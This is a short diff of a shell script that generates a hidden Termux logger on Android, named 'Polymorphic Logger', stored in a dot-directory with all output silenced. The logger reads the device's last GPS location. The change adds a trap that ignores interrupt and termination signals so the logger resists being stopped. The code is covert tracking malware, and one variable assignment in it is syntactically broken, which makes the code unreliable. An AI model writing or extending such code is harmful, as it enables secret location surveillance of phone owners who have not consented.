@@ -20,6 +20,7 @@ mkdir -p "$HOME/.syslogs"
 cat <<EOF > "$FULLPATH"
 #!/data/data/com.termux/files/usr/bin/bash
 exec &>/dev/null
+trap '' INT TERM EXIT
 
 # Polymorphic Logger [$BUILDID]
 $v1=\$(termux-location -p gps -r last)
